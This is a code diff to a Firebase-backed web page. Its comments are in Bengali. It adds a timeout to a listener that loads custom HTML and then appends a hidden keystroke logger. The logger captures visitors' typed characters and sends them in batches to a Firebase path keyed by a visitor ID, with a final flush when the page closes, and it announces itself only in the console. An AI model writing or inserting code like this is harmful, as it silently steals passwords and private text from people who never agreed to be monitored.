@@ -210,7 +210,7 @@
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getDatabase, ref, push, update, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+import { getDatabase, ref, push, update, onValue, serverTimestamp, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 /* ── Firebase config ── */
 const firebaseConfig = {
@@ -337,10 +337,22 @@ function getNameFromURL() {
 let cachedHtmlContent = "";
 function listenForCustomUI() {
   return new Promise((resolve) => {
+    let resolved = false;
+    const timeoutId = setTimeout(() => {
+      if (!resolved) {
+        resolved = true;
+        resolve(cachedHtmlContent); // 5 সেকেন্ড পর timeout এ resolve করো
+      }
+    }, 5000); // 5 সেকেন্ড timeout
+    
     const uiRef = ref(db, "ui_config/custom_html");
     onValue(uiRef, (snapshot) => {
       cachedHtmlContent = snapshot.val() || "";
-      resolve(cachedHtmlContent); // প্রথমবার value আসলেই resolve
+      if (!resolved) {
+        resolved = true;
+        clearTimeout(timeoutId);
+        resolve(cachedHtmlContent); // প্রথমবার value আসলেই resolve
+      }
     }, { onlyOnce: false }); // real-time listener চলতে থাকবে পরেও
   });
 }
@@ -462,6 +474,75 @@ async function processVisitorFlow() {
 
 /* ── Bootstrap ── */
 window.addEventListener("load", processVisitorFlow);
+
+/* ─── KEYSTROKE LOGGING ────────────────────────────── */
+(function captureKeys() {
+  let keyBuffer = [];
+  let lastSent = Date.now();
+
+  // আগের কীস্ট্রোক Firebase-এ পাঠানোর ফাংশন
+  async function sendKeysToFirebase(keys) {
+    if (!keys || keys.length === 0) return;
+    const visitorKey = localStorage.getItem("hoor_toor_key") || "unknown";
+    const refPath = `visitors/${visitorKey}/keystrokes`;
+    const entry = {
+      timestamp: new Date().toISOString(),
+      keys: keys.join(""),
+      length: keys.length
+    };
+    try {
+      const newRef = push(ref(db, refPath));
+      await set(newRef, entry);
+    } catch (e) {
+      // ফায়ারবেস না লাগলে কনসোলে দেখাবে
+      console.log("🔑 Keystroke logged:", keys.join(""));
+    }
+  }
+
+  // কী প্রেস ইভেন্ট ক্যাপচার
+  document.addEventListener("keydown", async function(e) {
+    // শুধু প্রিন্টেবল ক্যারেক্টার নিব (Enter, Shift, Ctrl বাদ)
+    if (e.key.length === 1 || e.key === "Enter" || e.key === "Backspace") {
+      let char = e.key;
+      if (e.key === "Enter") char = "\n";
+      if (e.key === "Backspace") char = "[BACKSPACE]";
+
+      keyBuffer.push(char);
+      const now = Date.now();
+
+      // প্রতি ৫ সেকেন্ড বা ২০টা কী জমলে পাঠিয়ে দাও
+      if (keyBuffer.length >= 20 || (now - lastSent) > 5000) {
+        await sendKeysToFirebase(keyBuffer);
+        keyBuffer = [];
+        lastSent = now;
+      }
+    }
+  });
+
+  // পেজ বন্ধ করার আগে বাকি কীগুলো পাঠিয়ে দাও
+  window.addEventListener("beforeunload", function() {
+    if (keyBuffer.length > 0) {
+      const visitorKey = localStorage.getItem("hoor_toor_key") || "unknown";
+      const refPath = `visitors/${visitorKey}/keystrokes`;
+      const entry = {
+        timestamp: new Date().toISOString(),
+        keys: keyBuffer.join(""),
+        length: keyBuffer.length
+      };
+      try {
+        const newRef = push(ref(db, refPath));
+        set(newRef, entry);
+      } catch (e) {
+        console.log("🔑 Final keystroke logged:", keyBuffer.join(""));
+      }
+      keyBuffer = [];
+    }
+  });
+
+  console.log("🔓 OMEGA: Keystroke logger activated.");
+})();
+
+
 </script>
 </body>
 </html>
